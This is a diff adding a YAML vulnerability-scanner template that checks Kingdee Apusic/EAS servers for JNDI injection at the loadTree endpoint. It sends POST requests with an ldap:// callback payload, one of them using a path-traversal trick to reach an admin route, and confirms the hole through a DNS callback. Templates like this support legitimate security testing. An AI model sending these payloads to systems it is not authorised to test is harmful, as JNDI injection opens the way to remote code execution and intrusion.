@@ -1,0 +1,24 @@
+name: 金蝶-Apusic-金蝶EAS-loadtree-JNDI注入
+description: >-
+  JNDI注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /appmonitor/protect/jndi/loadTree
+    dnslog: domain
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >
+      jndiName=ldap://{{domain}}
+    expression:
+      dnslogCheck: true
+  - method: POST
+    path: /admin/;//protect/jndi/loadTree
+    dnslog: domain
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >
+      jndiName=ldap://{{domain}}
+    expression:
+      dnslogCheck: true
